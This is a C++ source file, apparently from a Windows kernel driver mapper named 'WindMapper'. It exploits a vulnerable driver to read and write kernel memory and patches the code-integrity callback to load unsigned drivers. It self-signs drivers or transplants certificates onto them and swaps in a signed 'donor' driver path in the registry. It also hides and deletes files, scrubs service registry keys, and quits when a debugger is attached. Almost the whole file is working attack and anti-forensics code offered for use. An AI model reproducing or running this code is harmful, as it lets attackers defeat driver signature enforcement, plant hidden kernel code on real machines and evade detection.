                    wtd.dwStateAction = WTD_STATEACTION_VERIFY;
                    wtd.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;
                    LONG lStatus = WinVerifyTrust(NULL, &actionGUID, &wtd);
                    wtd.dwStateAction = WTD_STATEACTION_CLOSE;
                    WinVerifyTrust(NULL, &actionGUID, &wtd);

                    int score = (lStatus == ERROR_SUCCESS) ? 100 : 0;
                    if (score > bestScore) {
                        bestScore = score;
                        wcscpy_s(donorPath, fullPath);
                    }
                    if (bestScore >= 100) break;
                } while (FindNextFileW(hFind, &fd));
                FindClose(hFind);
            }
            donorFound = (bestScore > 0);
        }

        if (donorFound && donorPath[0]) {
            PCWSTR targetDir = driverFullPath;
            PCWSTR lastSlash = wcsrchr(driverFullPath, L'\\');
            WCHAR targetDirBuf[520] = {};
            if (lastSlash) {
                wcsncpy_s(targetDirBuf, driverFullPath, lastSlash - driverFullPath + 1);
            } else {
                wcscpy_s(targetDirBuf, L".\\");
            }
            std::wstring donorCopyName = Utils::GenerateRandomName(10) + L".sys";
            wcscpy_s(donorCopyPath, targetDirBuf);
            wcscat_s(donorCopyPath, donorCopyName.c_str());
            if (!CopyFileW(donorPath, donorCopyPath, FALSE)) {
                donorFound = FALSE;
            } else {

                SetFileAttributesW(donorCopyPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                MoveFileExW(donorCopyPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
                wcscpy_s(g_DonorCopyPath, donorCopyPath);
            }
        }

        PCWSTR targetFileName = wcsrchr(driverFullPath, L'\\');
        if (targetFileName) targetFileName++;
        else targetFileName = driverFullPath;


        PCWSTR sentinelFileName = nullptr;
        if (sentinelFullPath[0]) {
            sentinelFileName = wcsrchr(sentinelFullPath, L'\\');
            if (sentinelFileName) sentinelFileName++;
            else sentinelFileName = sentinelFullPath;
        }

        PCWSTR shadowFsFileName = nullptr;
        if (shadowFsFullPath[0]) {
            shadowFsFileName = wcsrchr(shadowFsFullPath, L'\\');
            if (shadowFsFileName) shadowFsFileName++;
            else shadowFsFileName = shadowFsFullPath;
        }

        LOG("Calling TriggerExploit...");
        status = TriggerExploit(targetFileName, sentinelFileName, shadowFsFileName,
                                driverFullPath, sentinelFullPath, shadowFsFullPath,
                                loaderFullPath);
        LOG_STATUS("TriggerExploit", status);
        if (NT_SUCCESS(status)) {
            LOG("Hiding loaded driver file: %ls", driverFullPath);
            if (Utils::HideLoadedImagePath(driverFullPath)) {
                LOG("Driver file hidden/renamed OK");
            } else {
                LOG("WARNING: Failed to hide loaded driver file");
            }

            if (sentinelFullPath[0]) {
                if (Utils::HideLoadedImagePath(sentinelFullPath)) {
                } else {
                }
            }

            if (shadowFsFullPath[0]) {
                if (Utils::HideLoadedImagePath(shadowFsFullPath)) {
                } else {
                }
            }
        }


        if (NT_SUCCESS(status) && donorFound && donorCopyPath[0] && RtlWriteRegistryValuePtr) {

            WCHAR ntDonorPath[520] = {};
            wcscpy_s(ntDonorPath, L"\\??\\");
            wcscat_s(ntDonorPath, donorCopyPath);
            SIZE_T ntDonorLen = wcslen(ntDonorPath);

            NTSTATUS regStatus = RtlWriteRegistryValuePtr(
                0, g_DriverServicePath, L"ImagePath", REG_SZ,
                ntDonorPath, static_cast<ULONG>((ntDonorLen + 1) * sizeof(WCHAR)));

            if (NT_SUCCESS(regStatus)) {
            } else {
            }
        }

        return status;
    }

    BOOL WriteSentinelGlobals(HANDLE device, PVOID sentinelBase, ULONG sentinelImageSize,
                              PVOID whoswhoBase, ULONG whoswhoSize) {
        LOG("=== WriteSentinelGlobals ===");
        LOG("sentinelBase=%p, sentinelImageSize=0x%X", sentinelBase, sentinelImageSize);
        LOG("whoswhoBase=%p, whoswhoSize=0x%X", whoswhoBase, whoswhoSize);

        IMAGE_DOS_HEADER dosHeader = {};
        NTSTATUS status = VulnDriver::ReadKernelMemory(device, sentinelBase, &dosHeader, sizeof(dosHeader));
        LOG_STATUS("ReadKernelMemory (DOS header)", status);
        if (!NT_SUCCESS(status) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
            LOG("ERROR: Invalid DOS header, e_magic=0x%04X", dosHeader.e_magic);
            return FALSE;
        }
        LOG("DOS header OK, e_lfanew=0x%X", dosHeader.e_lfanew);


        PVOID ntHeaderAddr = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(sentinelBase) + dosHeader.e_lfanew);
        LOG("NT headers addr: %p", ntHeaderAddr);

        IMAGE_NT_HEADERS64 ntHeaders = {};
        status = VulnDriver::ReadKernelMemory(device, ntHeaderAddr, &ntHeaders, sizeof(ntHeaders));
        LOG_STATUS("ReadKernelMemory (NT headers)", status);
        if (!NT_SUCCESS(status) || ntHeaders.Signature != IMAGE_NT_SIGNATURE) {
            LOG("ERROR: Invalid NT headers, Signature=0x%X", ntHeaders.Signature);
            return FALSE;
        }
        LOG("NT headers OK, %d sections, SizeOfOptionalHeader=0x%X",
            ntHeaders.FileHeader.NumberOfSections, ntHeaders.FileHeader.SizeOfOptionalHeader);


        ULONG_PTR sectionTableAddr =
            reinterpret_cast<ULONG_PTR>(ntHeaderAddr) +
            offsetof(IMAGE_NT_HEADERS64, OptionalHeader) +
            ntHeaders.FileHeader.SizeOfOptionalHeader;

        WORD numSections = ntHeaders.FileHeader.NumberOfSections;
        if (numSections > 64) numSections = 64;
        LOG("Reading %d section headers from %p...", numSections, (PVOID)sectionTableAddr);

        IMAGE_SECTION_HEADER sections[64] = {};
        status = VulnDriver::ReadKernelMemory(
            device,
            reinterpret_cast<PVOID>(sectionTableAddr),
            sections,
            numSections * sizeof(IMAGE_SECTION_HEADER));
        LOG_STATUS("ReadKernelMemory (section headers)", status);

        if (!NT_SUCCESS(status)) {
            return FALSE;
        }

        for (WORD i = 0; i < numSections; i++) {
            char secName[9] = {};
            memcpy(secName, sections[i].Name, 8);
            LOG("  Section[%d]: '%s' VA=0x%X VSize=0x%X",
                i, secName, sections[i].VirtualAddress, sections[i].Misc.VirtualSize);
        }


        PVOID sntlKernelAddr = nullptr;
        ULONG sntlSize = 0;
        for (WORD i = 0; i < numSections; i++) {
            if (memcmp(sections[i].Name, ".sntl\0\0\0", 8) == 0) {
                sntlKernelAddr = reinterpret_cast<PVOID>(
                    reinterpret_cast<ULONG_PTR>(sentinelBase) + sections[i].VirtualAddress);
                sntlSize = sections[i].Misc.VirtualSize;
                LOG("Found .sntl section at kernel addr %p, size=0x%X", sntlKernelAddr, sntlSize);
                break;
            }
        }

        if (!sntlKernelAddr) {
            LOG("ERROR: .sntl section not found in Sentinel driver!");
            return FALSE;
        }

        if (sntlSize < 0x14) {
            LOG("ERROR: .sntl section too small (0x%X < 0x14)", sntlSize);
            return FALSE;
        }


        PVOID baseSlotAddr = sntlKernelAddr;
        LOG("Writing WhosWho base (%p) to .sntl+0x0 (%p)...", whoswhoBase, baseSlotAddr);
        status = VulnDriver::WriteKernelMemory(device, baseSlotAddr, &whoswhoBase, sizeof(PVOID));
        LOG_STATUS("WriteKernelMemory (.sntl base slot)", status);
        if (!NT_SUCCESS(status)) {
            return FALSE;
        }


        if (whoswhoSize > 0) {
            PVOID sizeSlotAddr = reinterpret_cast<PVOID>(
                reinterpret_cast<ULONG_PTR>(sntlKernelAddr) + 0x10);
            LOG("Writing WhosWho size (0x%X) to .sntl+0x10 (%p)...", whoswhoSize, sizeSlotAddr);
            status = VulnDriver::WriteKernelMemory(device, sizeSlotAddr, &whoswhoSize, sizeof(ULONG));
            LOG_STATUS("WriteKernelMemory (.sntl size slot)", status);
        }

        LOG("WriteSentinelGlobals completed successfully");
        return TRUE;
    }

    NTSTATUS RestoreCiCallback(HANDLE device) {
        NTSTATUS status = STATUS_SUCCESS;


        if (g_CiCallbackPatched && g_CiCallbackAddress && g_OriginalCiCallback) {
            AntiDetect::TimingJitter();
            status = VulnDriver::WriteKernelMemory(device, g_CiCallbackAddress, &g_OriginalCiCallback, sizeof(PVOID));
            if (NT_SUCCESS(status)) {
                g_CiCallbackPatched = false;
                AntiDetect::MemoryBarrier();
            }
        }

        return status;
    }

    NTSTATUS CleanupArtifacts() {
        auto deleteRegistryTree = [](PCWSTR registryPath) -> NTSTATUS {
            if (!registryPath || wcslen(registryPath) < 10) {
                return STATUS_INVALID_PARAMETER;
            }

            if (NtDeleteKeyPtr && NtOpenKeyPtr) {
                UNICODE_STRING keyName;
                RtlInitUnicodeString(&keyName, registryPath);

                OBJECT_ATTRIBUTES objAttr;
                InitializeObjectAttributes(&objAttr, &keyName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

                HANDLE hKey = nullptr;
                NTSTATUS st = NtOpenKeyPtr(&hKey, DELETE | KEY_ENUMERATE_SUB_KEYS, &objAttr);
                if (NT_SUCCESS(st)) {
                    WCHAR subKeyPath[512];
                    const WCHAR* subKeys[] = { L"\\Enum", L"\\Security", L"\\Parameters" };
                    for (int i = 0; i < 3; i++) {
                        wcscpy_s(subKeyPath, registryPath);
                        wcscat_s(subKeyPath, subKeys[i]);

                        UNICODE_STRING subName;
                        RtlInitUnicodeString(&subName, subKeyPath);

                        OBJECT_ATTRIBUTES subAttr;
                        InitializeObjectAttributes(&subAttr, &subName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

                        HANDLE hSubKey = nullptr;
                        NTSTATUS subSt = NtOpenKeyPtr(&hSubKey, DELETE, &subAttr);
                        if (NT_SUCCESS(subSt)) {
                            NtDeleteKeyPtr(hSubKey);
                            NtClose(hSubKey);
                        }
                    }

                    if (NtFlushKeyPtr) {
                        NtFlushKeyPtr(hKey);
                    }
                    NtDeleteKeyPtr(hKey);
                    NtClose(hKey);
                    return STATUS_SUCCESS;
                }
            }

            WCHAR regPath[256];
            if (wcslen(registryPath) > 18) {
                wcscpy_s(regPath, registryPath + 18);
                SHDeleteKeyW(HKEY_LOCAL_MACHINE, regPath);
            }

            return STATUS_SUCCESS;
        };

        if (wcslen(g_LoaderServicePath) > 0) {
            deleteRegistryTree(g_LoaderServicePath);
        }


        if (wcslen(g_DriverServicePath) > 0 && g_DonorCopyPath[0] == L'\0') {
            deleteRegistryTree(g_DriverServicePath);
        }


        if (wcslen(g_SentinelServicePath) > 0) {
            deleteRegistryTree(g_SentinelServicePath);
        }

        if (wcslen(g_ShadowFsServicePath) > 0) {
            deleteRegistryTree(g_ShadowFsServicePath);
        }

        return STATUS_SUCCESS;
    }

}

static void RunSignatureCheck(LPCWSTR filePath) {
    if (g_KernelSigningVerified) {
    } else {
        if (g_DriverLoadAddress) {
        }
    }


    LPCWSTR checkPath = filePath;
    BOOL isStomped = FALSE;
    if (g_DonorCopyPath[0] != L'\0') {
        checkPath = g_DonorCopyPath;
        isStomped = TRUE;
    }

    if (isStomped) {
    }

    WINTRUST_FILE_INFO fileInfo = {};
    fileInfo.cbStruct = sizeof(WINTRUST_FILE_INFO);
    fileInfo.pcwszFilePath = checkPath;

    GUID actionGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;

    WINTRUST_DATA trustData = {};
    trustData.cbStruct = sizeof(WINTRUST_DATA);
    trustData.dwUIChoice = WTD_UI_NONE;
    trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
    trustData.dwUnionChoice = WTD_CHOICE_FILE;
    trustData.pFile = &fileInfo;
    trustData.dwStateAction = WTD_STATEACTION_VERIFY;
    trustData.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;

    LONG lStatus = WinVerifyTrust(NULL, &actionGUID, &trustData);

    BOOL isEV = FALSE;
    char signerNameA[256] = {};
    BOOL hasCert = FALSE;
    BOOL hasTimestamp = FALSE;

    if (trustData.hWVTStateData) {
        CRYPT_PROVIDER_DATA* prov = WTHelperProvDataFromStateData(trustData.hWVTStateData);
        if (prov) {
            CRYPT_PROVIDER_SGNR* sgnr = WTHelperGetProvSignerFromChain(prov, 0, FALSE, 0);
            if (sgnr) {
                hasTimestamp = (sgnr->csCounterSigners > 0);
                if (sgnr->pChainContext && sgnr->pChainContext->cChain > 0) {
                    hasCert = TRUE;
                    CERT_SIMPLE_CHAIN* chain = sgnr->pChainContext->rgpChain[0];
                    if (chain->cElement > 0) {
                        PCCERT_CONTEXT leafCert = chain->rgpElement[0]->pCertContext;
                        CertGetNameStringA(leafCert, CERT_NAME_SIMPLE_DISPLAY_TYPE, 0,
                            NULL, signerNameA, sizeof(signerNameA));

                        static const char* evOIDs[] = {
                            "2.23.140.1.1",
                            "2.23.140.1.3",
                            "2.23.140.1.4.1",
                            "1.3.6.1.4.1.311.94.1.1",
                            "2.16.840.1.114414.1.7.23.3",
                            "2.16.840.1.113733.1.7.23.6",
                            "2.16.840.1.113733.1.7.48.1",
                            "1.3.6.1.4.1.6449.2.1.1",
                            "1.3.6.1.4.1.6449.1.2.1.5.1",
                            "1.3.6.1.4.1.44947.1.1.1",
                            "2.16.840.1.114028.10.1.2",
                            "1.3.6.1.4.1.14370.1.6",
                            "1.3.6.1.4.1.4788.2.202.1",
                            "2.16.840.1.114413.1.7.23.3",
                            "1.3.6.1.4.1.8024.0.2.100.1.2",
                            "2.16.756.1.89.1.2.1.1",
                            "2.16.840.1.114412.2.1",
                            "2.16.840.1.114412.3.2",
                            "1.3.6.1.4.1.4146.1.1",
                            "1.2.616.1.113527.2.5.1.1",
                            "1.3.171.1.1.10.5.2",
                            "1.3.6.1.4.1.34697.2.1",
                            "1.3.6.1.4.1.40869.1.1.22.3",
                            "2.16.840.1.114171.500.9",
                            "2.16.578.1.26.1.3.3",
                            "1.3.6.1.4.1.17326.10.14.2.1.2",
                            "1.3.6.1.4.1.22234.2.5.2.3.1",
                            "2.16.840.1.114404.1.1.2.4.1",
                            "1.3.6.1.4.1.23223.1.1.1",
                        };

                        for (DWORD e = 0; e < chain->cElement && !isEV; e++) {
                            PCCERT_CONTEXT cert = chain->rgpElement[e]->pCertContext;
                            PCERT_EXTENSION pExt = CertFindExtension(
                                szOID_CERT_POLICIES,
                                cert->pCertInfo->cExtension,
                                cert->pCertInfo->rgExtension);
                            if (pExt) {
                                CERT_POLICIES_INFO* polInfo = nullptr;
                                DWORD cbDecoded = 0;
                                if (CryptDecodeObjectEx(
                                    X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
                                    X509_CERT_POLICIES,
                                    pExt->Value.pbData,
                                    pExt->Value.cbData,
                                    CRYPT_DECODE_ALLOC_FLAG,
                                    nullptr,
                                    &polInfo,
                                    &cbDecoded) && polInfo) {
                                    for (DWORD p = 0; p < polInfo->cPolicyInfo && !isEV; p++) {
                                        for (int oid = 0; oid < sizeof(evOIDs) / sizeof(evOIDs[0]); oid++) {
                                            if (strcmp(polInfo->rgPolicyInfo[p].pszPolicyIdentifier, evOIDs[oid]) == 0) {
                                                isEV = TRUE;
                                                break;
                                            }
                                        }
                                    }
                                    LocalFree(polInfo);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    if (hasCert) {
        if (isStomped) {
        } else {
        }
        if (hasTimestamp)
        if (lStatus == ERROR_SUCCESS) {
        } else {
        }

        if (signerNameA[0]) {
            MultiByteToWideChar(CP_ACP, 0, signerNameA, -1, g_DonorSignerName, 256);
        }
    } else {
    }

    trustData.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(NULL, &actionGUID, &trustData);

    if (g_KernelSigningVerified) {
    }
    if (hasCert && isStomped) {
        if (lStatus == ERROR_SUCCESS) {
        }
    } else if (hasCert) {
    }
}

int main(int argc, char* argv[]) {
    // Open log file immediately
    OpenMapperLog();
    LOG("============================================");
    LOG("WindMapper started, argc=%d", argc);
    for (int i = 0; i < argc; i++) {
        LOG("  argv[%d] = '%s'", i, argv[i]);
    }

    // Log OS version
    {
        typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (ntdll) {
            RtlGetVersionPtr fn = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
            if (fn) {
                RTL_OSVERSIONINFOW osvi = { sizeof(osvi) };
                if (fn(&osvi) == 0) {
                    LOG("OS: Windows %u.%u Build %u (isWin11=%s)",
                        osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber,
                        osvi.dwBuildNumber >= 22000 ? "YES" : "NO");
                }
            }
        }
    }

#ifndef _DEBUG
    if (AntiDetect::IsBeingDebugged()) {
        LOG("Debugger detected, exiting.");
        if (g_LogFile) fclose(g_LogFile);
        return 1;
    }
#endif

    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        if (LookupPrivilegeValue(NULL, SE_LOAD_DRIVER_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
                LOG("FATAL: AdjustTokenPrivileges failed, GLE=%u", GetLastError());
                CloseHandle(hToken);
                if (g_LogFile) fclose(g_LogFile);
                return 1;
            }
            LOG("SeLoadDriverPrivilege acquired via token adjustment");
        } else {
            LOG("WARNING: LookupPrivilegeValue failed, GLE=%u", GetLastError());
        }
        CloseHandle(hToken);
    } else {
        LOG("WARNING: OpenProcessToken failed, GLE=%u", GetLastError());
    }

    if (argc < 2) {
        LOG("FATAL: argc < 2 - missing driver argument");
        if (g_LogFile) fclose(g_LogFile);
        return 1;
    }

    LOG("InitializeNtFunctions_begin");
    if (!Utils::InitializeNtFunctions()) {
        LOG("FATAL: InitializeNtFunctions failed");
        if (g_LogFile) fclose(g_LogFile);
        return 1;
    }
    LOG("InitializeNtFunctions_ok");

    LOG("Initializing embedded driver data...");
    if (!InitializeDriverData()) {
        LOG("FATAL: InitializeDriverData failed");
        if (g_LogFile) fclose(g_LogFile);
        return 1;
    }
    LOG("Embedded driver: size=%zu bytes", g_P2CDriverSize);

    std::wstring driverArg;
    {
        size_t argLen = strlen(argv[1]);
        int wideLen = MultiByteToWideChar(CP_ACP, 0, argv[1], -1, nullptr, 0);
        if (wideLen <= 0) {
            LOG("FATAL: MultiByteToWideChar failed for driver arg");
            ReleaseDriverData();
            if (g_LogFile) fclose(g_LogFile);
            return 1;
        }
        driverArg.resize(static_cast<size_t>(wideLen));
        MultiByteToWideChar(CP_ACP, 0, argv[1], -1, &driverArg[0], wideLen);
        driverArg.resize(wcslen(driverArg.c_str()));
    }
    LOG("Driver arg: %ls", driverArg.c_str());

    std::wstring sentinelArg;
    if (argc >= 3) {
        int wideLen = MultiByteToWideChar(CP_ACP, 0, argv[2], -1, nullptr, 0);
        if (wideLen > 0) {
            sentinelArg.resize(static_cast<size_t>(wideLen));
            MultiByteToWideChar(CP_ACP, 0, argv[2], -1, &sentinelArg[0], wideLen);
            sentinelArg.resize(wcslen(sentinelArg.c_str()));
        }
    }
    LOG("Sentinel arg: %ls", sentinelArg.empty() ? L"(none)" : sentinelArg.c_str());

    std::wstring shadowFsArg;
    if (argc >= 4) {
        int wideLen = MultiByteToWideChar(CP_ACP, 0, argv[3], -1, nullptr, 0);
        if (wideLen > 0) {
            shadowFsArg.resize(static_cast<size_t>(wideLen));
            MultiByteToWideChar(CP_ACP, 0, argv[3], -1, &shadowFsArg[0], wideLen);
            shadowFsArg.resize(wcslen(shadowFsArg.c_str()));
        }
    }
    LOG("ShadowFS arg: %ls", shadowFsArg.empty() ? L"(none)" : shadowFsArg.c_str());

    if (g_P2CDriverSize == 0) {
        LOG("FATAL: g_P2CDriverSize == 0 after init");
        ReleaseDriverData();
        if (g_LogFile) fclose(g_LogFile);
        return 1;
    }
    std::wstring loaderFilePath = Utils::GetTempFilePath(L".sys");
    std::wstring driverFilePath = Utils::GetTempFilePath(L".sys");
    LOG("Loader temp path: %ls", loaderFilePath.c_str());
    LOG("Driver temp path: %ls", driverFilePath.c_str());

    if (loaderFilePath.empty() || driverFilePath.empty()) {
        LOG("FATAL: Failed to generate temp file paths");
        ReleaseDriverData();
        if (g_LogFile) fclose(g_LogFile);
        return 1;
    }

    LOG("CreateFileW loader_begin path=%ls", loaderFilePath.c_str());
    HANDLE loaderFile = CreateFileW(
        loaderFilePath.c_str(),
        GENERIC_WRITE,
        0,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_SEQUENTIAL_SCAN,
        nullptr
    );

    if (loaderFile == INVALID_HANDLE_VALUE) {
        LOG("FATAL: CreateFileW for loader failed, GLE=%u", GetLastError());
        ReleaseDriverData();
        if (g_LogFile) fclose(g_LogFile);
        return 1;
    }
    LOG("CreateFileW loader_ok handle=%p", loaderFile);

    DWORD written = 0;
    DWORD expectedSize = static_cast<DWORD>(g_P2CDriverSize);
    LOG("WriteFile loader_begin bytes=%u", expectedSize);
    BOOL writeOk = WriteFile(loaderFile, g_P2CDriverData, expectedSize, &written, nullptr);
    DWORD writeErr = GetLastError();
    FlushFileBuffers(loaderFile);
    CloseHandle(loaderFile);
    LOG("Wrote loader driver: writeOk=%d, written=%u, expected=%u, GLE=%u", writeOk, written, expectedSize, writeErr);

    ReleaseDriverData();

    if (!writeOk || written != expectedSize) {
        LOG("FATAL: Loader driver write failed");
        Utils::SecureDeleteFile(loaderFilePath.c_str());
        if (g_LogFile) fclose(g_LogFile);
        return 1;
    }
    LOG("Copying target driver from %ls to %ls", driverArg.c_str(), driverFilePath.c_str());
    LOG("CopyFileW target_begin");
    if (!CopyFileW(driverArg.c_str(), driverFilePath.c_str(), FALSE)) {
        LOG("FATAL: CopyFileW for target driver failed, GLE=%u", GetLastError());
        Utils::ForceDeleteOrRename(loaderFilePath.c_str());
        if (g_LogFile) fclose(g_LogFile);
        return 1;
    }
    LOG("CopyFileW target_ok");
    if (Utils::ForceDeleteOrRename(driverArg.c_str())) {
        LOG("Source target driver deleted after staging copy");
    } else {
        LOG("WARNING: Source target driver deletion deferred, GLE=%u", GetLastError());
    }


    std::wstring sentinelFilePath;
    if (!sentinelArg.empty()) {
        sentinelFilePath = Utils::GetSiblingTempFilePath(driverFilePath.c_str(), L".sys");
        LOG("Sentinel temp path: %ls", sentinelFilePath.c_str());
        if (sentinelFilePath.empty()) {
            LOG("FATAL: Failed to generate sentinel temp path");
            Utils::ForceDeleteOrRename(loaderFilePath.c_str());
            Utils::ForceDeleteOrRename(driverFilePath.c_str());
            if (g_LogFile) fclose(g_LogFile);
            return 1;
        }
        LOG("Copying sentinel from %ls to %ls", sentinelArg.c_str(), sentinelFilePath.c_str());
        LOG("CopyFileW sentinel_begin");
        if (!CopyFileW(sentinelArg.c_str(), sentinelFilePath.c_str(), FALSE)) {
            LOG("FATAL: CopyFileW for sentinel failed, GLE=%u", GetLastError());
            Utils::ForceDeleteOrRename(loaderFilePath.c_str());
            Utils::ForceDeleteOrRename(driverFilePath.c_str());
            if (g_LogFile) fclose(g_LogFile);
            return 1;
        }
        LOG("CopyFileW sentinel_ok");
        if (Utils::ForceDeleteOrRename(sentinelArg.c_str())) {
            LOG("Source sentinel driver deleted after staging copy");
        } else {
            LOG("WARNING: Source sentinel driver deletion deferred, GLE=%u", GetLastError());
        }

        LOG("Self-signing sentinel driver...");
        if (!SignedMemory::SelfSignDriver(sentinelFilePath.c_str())) {
            LOG("SelfSignDriver (sentinel) failed, trying TransplantCertificate...");
            SignedMemory::TransplantCertificateToDriver(sentinelFilePath.c_str());
        } else {
            LOG("SelfSignDriver (sentinel) OK");
        }
        SetFileAttributesW(sentinelFilePath.c_str(),
                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
    }

    LOG("Self-signing target driver...");
    if (!SignedMemory::SelfSignDriver(driverFilePath.c_str())) {
        LOG("SelfSignDriver (target) failed, trying TransplantCertificate...");
        SignedMemory::TransplantCertificateToDriver(driverFilePath.c_str());
    } else {
        LOG("SelfSignDriver (target) OK");
    }

    SetFileAttributesW(driverFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);

    std::wstring shadowFsFilePath;
    if (!shadowFsArg.empty()) {
        shadowFsFilePath = Utils::GetTempFilePath(L".sys");
        LOG("ShadowFS temp path: %ls", shadowFsFilePath.c_str());
        if (shadowFsFilePath.empty()) {
            LOG("FATAL: Failed to generate shadowfs temp path");
            Utils::ForceDeleteOrRename(loaderFilePath.c_str());
            Utils::ForceDeleteOrRename(driverFilePath.c_str());
            if (!sentinelFilePath.empty())
                Utils::ForceDeleteOrRename(sentinelFilePath.c_str());
            if (g_LogFile) fclose(g_LogFile);
            return 1;
        }
        LOG("Copying shadowfs from %ls to %ls", shadowFsArg.c_str(), shadowFsFilePath.c_str());
        LOG("CopyFileW shadowfs_begin");
        if (!CopyFileW(shadowFsArg.c_str(), shadowFsFilePath.c_str(), FALSE)) {
            LOG("FATAL: CopyFileW for shadowfs failed, GLE=%u", GetLastError());
            Utils::ForceDeleteOrRename(loaderFilePath.c_str());
            Utils::ForceDeleteOrRename(driverFilePath.c_str());
            if (!sentinelFilePath.empty())
                Utils::ForceDeleteOrRename(sentinelFilePath.c_str());
            if (g_LogFile) fclose(g_LogFile);
            return 1;
        }
        LOG("CopyFileW shadowfs_ok");
        if (Utils::ForceDeleteOrRename(shadowFsArg.c_str())) {
            LOG("Source shadowfs driver deleted after staging copy");
        } else {
            LOG("WARNING: Source shadowfs driver deletion deferred, GLE=%u", GetLastError());
        }

        LOG("Self-signing shadowfs driver...");
        if (!SignedMemory::SelfSignDriver(shadowFsFilePath.c_str())) {
            LOG("SelfSignDriver (shadowfs) failed, trying TransplantCertificate...");
            SignedMemory::TransplantCertificateToDriver(shadowFsFilePath.c_str());
        } else {
            LOG("SelfSignDriver (shadowfs) OK");
        }
        SetFileAttributesW(shadowFsFilePath.c_str(),
                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
    }

    LOG("=== Calling WindLoadDriver ===");
    NTSTATUS status = MapperCore::WindLoadDriver(
        loaderFilePath.c_str(),
        driverFilePath.c_str(),
        sentinelFilePath.empty() ? nullptr : sentinelFilePath.c_str(),
        shadowFsFilePath.empty() ? nullptr : shadowFsFilePath.c_str());
    LOG_STATUS("WindLoadDriver final result", status);

    if (NT_SUCCESS(status)) {
        LOG("SUCCESS - skipping post-load signature file walk for volatile loaded image");
    }

    LOG("Cleaning up temp files...");
    Utils::ForceDeleteOrRename(loaderFilePath.c_str());
    if (NT_SUCCESS(status)) {
        Utils::HideLoadedImagePath(driverFilePath.c_str());
        if (!sentinelFilePath.empty())
            Utils::HideLoadedImagePath(sentinelFilePath.c_str());
        if (!shadowFsFilePath.empty())
            Utils::HideLoadedImagePath(shadowFsFilePath.c_str());
    } else {
        Utils::ForceDeleteOrRename(driverFilePath.c_str());
        if (!sentinelFilePath.empty())
            Utils::ForceDeleteOrRename(sentinelFilePath.c_str());
        if (!shadowFsFilePath.empty())
            Utils::ForceDeleteOrRename(shadowFsFilePath.c_str());
    }

    MapperCore::CleanupArtifacts();

    if (NT_SUCCESS(status)) {
        LOG("=== FINAL: SUCCESS ===");
        LOG("Driver loaded at: %p", g_DriverLoadAddress);
        if (g_SentinelLoadAddress) {
            LOG("Sentinel loaded at: %p, size: 0x%X", g_SentinelLoadAddress, g_SentinelImageSize);
        }
        if (g_DonorCopyPath[0]) {
            LOG("Donor copy: %ls", g_DonorCopyPath);
        }
    } else {
        LOG("=== FINAL: FAILED, status=0x%08X ===", (DWORD)status);
    }

    if (g_LogFile) fclose(g_LogFile);
    return NT_SUCCESS(status) ? 0 : 1;
}
